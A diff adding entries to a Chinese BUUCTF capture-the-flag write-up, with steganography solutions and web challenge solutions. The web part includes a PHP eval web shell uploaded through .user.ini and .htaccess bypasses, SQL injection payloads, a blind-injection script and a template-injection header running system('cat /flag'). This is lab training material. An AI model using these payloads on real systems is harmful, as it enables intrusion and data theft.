@@ -1397,7 +1397,103 @@ TweakPNG修改宽高即可看到flag
 
 键盘解密
 
+### 63. [MRCTF2020]你能看懂音符吗
 
+解压错误，rar文件头修改下：
+
+![image-20240109133655212](buu_wp.assets/image-20240109133655212.png)
+
+打开显示：
+
+![image-20240109133736869](buu_wp.assets/image-20240109133736869.png)
+
+改为zip后缀解压发现：
+
+![image-20240109134020180](buu_wp.assets/image-20240109134020180.png)
+
+音符解密https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue
+
+
+
+### 64. [SUCTF2018]single dog
+
+图片中有隐藏压缩包，binwalk分离：
+
+```shell
+binwalk attachment.jpg -e --run-as=root
+```
+
+分离出文件，百度了下是AAEncode编码，随波逐流解密：
+
+![image-20240109141253035](buu_wp.assets/image-20240109141253035.png)
+
+### 65. 我吃三明治
+
+由两张jpg图片拼接而成，010打开搜索下FF D9，拼接处有串字符，base32解密得到flag：
+
+![image-20240109142736193](buu_wp.assets/image-20240109142736193.png)
+
+### 66. [SWPU2019]你有没有好好看网课?
+
+一个压缩包提示密码是6位数字，ARCHPR爆破解压：
+
+![image-20240109144913610](buu_wp.assets/image-20240109144913610.png)
+
+解压出来是个视频和word，word内容：
+
+![image-20240109144959048](buu_wp.assets/image-20240109144959048.png)
+
+Potplayer打开mp4，一帧一帧看发现：
+
+![image-20240109144209870](buu_wp.assets/image-20240109144209870.png)
+
+有串代码，百度了下发现是敲击码：
+
+```
+..... ../... ./... ./... ../
+```
+
+/是划分符号，修改为空格后随波逐流解密下：
+
+![image-20240109145414738](buu_wp.assets/image-20240109145414738.png)
+
+继续逐帧查看：
+
+![image-20240109145545438](buu_wp.assets/image-20240109145545438.png)
+
+base64解密：
+
+![image-20240109145619270](buu_wp.assets/image-20240109145619270.png)
+
+拼接起来就是：
+
+```
+wllmup_up_up
+```
+
+解压另外一个压缩包，010打开搜索下得到flag
+
+
+
+### 67. [ACTF新生赛2020]NTFS数据流
+
+
+
+### 68. sqltest
+
+
+
+### john-in-the-middle
+
+### [ACTF新生赛2020]swp
+
+### [UTCTF2020]docx
+
+### [GXYCTF2019]SXMgdGhpcyBiYXNlPw==
+
+### 喵喵喵
+
+### 间谍启示录
 
 ## Web
 
@@ -2979,6 +3075,475 @@ O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=conver
 ```
 
 ### 30. [SUCTF 2019]CheckIn
+
+需要使用.user.ini来进行绕过，构造.user.ini：
+
+```ini
+GIF89a
+auto_prepend_file=a.jpg
+auto_append_file=a.jpg
+```
+
+再构造a.jpg：
+
+```php
+GIF89a
+<script language='php'> @eval($_POST['pass']);</script>
+```
+
+![image-20240109105546907](buu_wp.assets/image-20240109105546907.png)
+
+蚁剑连接，拿到flag
+
+.user.ini知识点：
+
+![img](buu_wp.assets/1270588-20190903201901495-357084982.png)
+
+### 31. [GXYCTF2019]BabyUpload
+
+上传发现有php后缀过滤：
+
+![image-20240109110218935](buu_wp.assets/image-20240109110218935.png)
+
+使用**.htaccess**绕过，先上传htaccess：
+
+```http
+POST / HTTP/1.1
+Host: e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------36243627783878118222275131329
+Content-Length: 410
+Origin: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+Connection: close
+Referer: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81/
+Cookie: PHPSESSID=aa0a1a04d8e88c5f310149314e0ae059
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/jpeg
+
+<FilesMatch "abc" >
+SetHandler application/x-httpd-php
+</FilesMatch>
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------36243627783878118222275131329--
+
+```
+
+再上传abc文件：
+
+```http
+POST / HTTP/1.1
+Host: e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------36243627783878118222275131329
+Content-Length: 397
+Origin: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+Connection: close
+Referer: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81/
+Cookie: PHPSESSID=aa0a1a04d8e88c5f310149314e0ae059
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="uploaded"; filename="abc"
+Content-Type: image/jpeg
+
+GIF89a
+<script language='php'> @eval($_POST['pass']);</script>
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------36243627783878118222275131329--
+
+```
+
+蚁剑连接，拿到flag
+
+### 32. [GXYCTF2019]BabySQli
+
+万能密码：
+
+```
+1' or 1=1#
+```
+
+登录，CTRL U 查看源码，发现有提示：
+
+```html
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>Do you know who am I?</title>
+
+
+
+do not hack me!
+```
+
+先base32解码再base64解码：
+
+![image-20240109111524431](buu_wp.assets/image-20240109111524431.png)
+
+得到sql语句：
+
+```sql
+select * from user where username = '$name'
+```
+
+需要使用联合查询构造虚拟查询记录进行登录：
+
+![img](buu_wp.assets/20201107203617325.png)
+
+如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag；
+
+百度了下密码需要使用md5加密下，构造payload：
+
+```
+'union select 1,'admin','202cb962ac59075b964b07152d234b70'-- q  
+
+密码输入123
+```
+
+得到flag
+
+### 33. [GYCTF2020]Blacklist
+
+和7. [强网杯 2019]随便注 类似，但本题有过滤，需要使用HANDLER 来进行绕过：
+
+**Handler语法**
+
+- handler语句：一行一行的浏览一个表中的数据；
+- handler语句并不具备select语句的所有功能；
+- mysql专用的语句，并没有包含到SQL标准中；
+- HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表；
+
+```sql
+HANDLER tbl_name OPEN
+```
+
+打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
+
+```
+HANDLER tbl_name READ FIRST
+```
+
+获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
+
+```
+HANDLER tbl_name CLOSE
+```
+
+关闭打开的句柄。
+
+```
+HANDLER tbl_name READ index_name = value
+```
+
+通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
+
+本题使用以下payload即可绕过：
+
+```
+1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
+```
+
+![image-20240109152737709](buu_wp.assets/image-20240109152737709.png)
+
+### 34. [CISCN2019 华北赛区 Day2 Web1]Hack World
+
+sql fuzz字典：
+
+```
+length 
++
+handler
+like
+select 
+sleep
+database
+delete
+having
+or
+as
+-~
+BENCHMARK
+limit
+left
+select
+insert
+sys.schema_auto_increment_columns
+join
+right
+#
+&
+&&
+\
+handler
+-- -
+--
+--+
+INFORMATION
+--
+;
+!
+%
++
+xor
+<>
+(
+>
+<
+)
+.
+^
+=
+AND
+BY
+CAST
+COLUMN
+COUNT
+CREATE
+END
+case
+'1'='1
+when
+admin'
+"
+length 
++
+length
+REVERSE
+
+ascii
+select 
+database
+left
+right
+'
+union
+||
+oorr
+/
+//
+//*
+*/*
+/**/
+anandd
+GROUP
+HAVING
+IF
+INTO
+JOIN
+LEAVE
+LEFT
+LEVEL
+sleep
+LIKE
+NAMES
+NEXT
+NULL
+OF
+ON
+|
+infromation_schema
+user
+OR
+ORDER
+ORD
+SCHEMA
+SELECT
+SET
+TABLE
+THEN
+UPDATE
+USER
+USING
+VALUE
+VALUES
+WHEN
+WHERE
+ADD
+AND
+prepare
+set
+update
+delete
+drop
+inset
+CAST
+COLUMN
+CONCAT
+GROUP_CONCAT
+group_concat
+CREATE
+DATABASE
+DATABASES
+alter
+DELETE
+DROP
+floor
+rand()
+information_schema.tables
+TABLE_SCHEMA
+%df
+concat_ws()
+concat
+LIMIT
+ORD
+ON
+extractvalue
+order 
+CAST()
+by
+ORDER
+OUTFILE
+RENAME
+REPLACE
+SCHEMA
+SELECT
+SET
+updatexml
+SHOW
+SQL
+TABLE
+THEN
+TRUE
+instr
+benchmark
+format
+bin
+substring
+ord
+
+UPDATE
+VALUES
+VARCHAR
+VERSION
+WHEN
+WHERE
+/*
+`
+  
+,
+users
+%0a
+%0b
+mid
+for
+BEFORE
+REGEXP
+RLIKE
+in
+sys schemma
+SEPARATOR
+XOR
+CURSOR
+FLOOR
+sys.schema_table_statistics_with_buffer
+INFILE
+count
+%0c
+from
+%0d
+%a0
+=
+@
+else
+
+
+
+```
+
+搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等，包括`/**/`，有意思的是输入`1/1`时会正常返回结果，可以判断这是数字型的sql注入。
+
+根据1和2返回结果的不同，可能是bool盲注，`()`没有过滤，可以使用大部分函数；
+
+过滤空格绕过：
+
+- `%09` `%0a` `%0b` `%0c` `%0d` `/**/` `/*!*/`
+- 直接tab
+- 括号
+
+跑脚本注入：
+
+```python
+import requests
+import time
+import re
+
+url='http://5629f1a8-007e-4f49-97ea-082dbe4c62a0.node5.buuoj.cn:81/'#题目链接
+flag = ''
+
+for i in range(1,50):#for循环遍历，i表示flag值大致长度是50以内
+    max = 127
+    min = 0
+
+    for c in range(0,127):
+        s = (int)((max+min)/2)
+        payload = '1^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'
+        #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。
+        #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 '+str(i)+' 开始，长度为 1（每次只返回一个））
+        #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 "s" 的变量。
+        r = requests.post(url,data = {'id':payload})
+        time.sleep(0.5)
+
+        if 'Hello, glzjin wants a girlfriend' in str(r.content):
+            max=s
+        else:
+            min=s
+        if((max-min)<=1):
+            flag+=chr(max)
+            print(flag)
+            break
+```
+
+另外payload也可以如下：
+
+```sql
+if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)  #该payload返回Hello, glzjin wants a girlfriend. 证明flag第一位为f
+
+```
+
+### 35. [网鼎杯 2018]Fakebook
+
+同adword 36. fakebook
+
+### 36. [BJDCTF2020]The mystery of ip
+
+- `X-Forwarded-For`（XFF，client-ip也可以）注入
+
+- **PHP**可能存在**Twig模版注入漏洞**
+
+
+
+payload：
+
+```http
+GET /flag.php HTTP/1.1
+Host: node5.buuoj.cn:26782
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://node5.buuoj.cn:26782/hint.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For:{{system('cat /flag')}}
+
+
+```
+
+### 37. [网鼎杯 2020 朱雀组]phpweb
 
 
 
